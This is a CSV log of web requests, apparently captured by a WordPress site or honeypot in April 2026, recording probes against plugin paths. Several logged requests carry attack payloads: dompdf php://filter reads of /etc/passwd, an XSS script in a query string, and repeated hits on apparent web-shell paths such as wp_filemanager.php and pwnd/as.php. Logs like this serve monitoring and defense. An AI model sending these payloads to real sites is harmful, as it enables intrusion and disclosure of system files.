"ip","time","path","useragent","source"
"172.68.164.74","2026-04-24T00:38:04Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.69.165.48","2026-04-24T02:25:00Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"162.158.189.152","2026-04-24T03:54:10Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.69.176.63","2026-04-24T04:10:07Z","/wp-content/plugins/dhtmlxspreadsheet/codebase/spreadsheet.php?page=%3Cscript%3Ealert(document.domain)%3C/script%3E","Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36","plugin_php"
"104.22.66.180","2026-04-24T04:21:18Z","/wp-content/plugins/wp-ecommerce-shop-styling/includes/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36","plugin_php"
"104.22.66.180","2026-04-24T04:21:18Z","/wp-content/plugins/web-portal-lite-client-portal-secure-file-sharing-private-messaging/includes/libs/pdf/dompdf.php?input_file=php://filter/resource=/etc/passwd","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:109.0) Gecko/20100101 Firefox/115.0","plugin_php"
"172.68.164.60","2026-04-24T04:21:18Z","/wp-content/plugins/abstract-submission/dompdf-0.5.1/dompdf.php?input_file=php://filter/resource=/etc/passwd","Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:70.0) Gecko/20100101 Firefox/70.0","plugin_php"
"104.23.175.53","2026-04-24T04:21:18Z","/wp-content/plugins/blogtopdf/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd","Mozilla/5.0 (X11; Linux x86_64; rv:1.9.6.20) Gecko/ Firefox/3.6.11","plugin_php"
"162.158.88.12","2026-04-24T04:21:18Z","/wp-content/plugins/post-pdf-export/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd","Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36","plugin_php"
"172.69.165.13","2026-04-24T04:21:18Z","/wp-content/plugins/buddypress-component-stats/lib/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
"172.71.124.217","2026-04-24T04:21:18Z","/wp-content/plugins/gboutique/library/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0","plugin_php"
"162.158.162.33","2026-04-24T04:43:16Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.68.164.55","2026-04-24T04:43:53Z","/wp-content/plugins/pwnd/as.php","-","plugin_php"
"162.158.170.19","2026-04-24T06:28:46Z","/wp-content/plugins/","Mozilla/5.0 (Macintosh; Intel Mac OS X 14.5; rv:138.0) Gecko/20100101 Firefox/138.0","plugin_php"
"104.23.175.6","2026-04-24T06:33:33Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.71.81.196","2026-04-24T07:00:52Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"104.22.66.181","2026-04-24T07:22:15Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"172.71.81.163","2026-04-24T07:57:15Z","/wp-content/plugins/hellopress/wp_filemanager.php","-","plugin_php"
"108.162.227.112","2026-04-24T08:38:30Z","/wp-content/plugins/twenty/login.php","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","plugin_php"
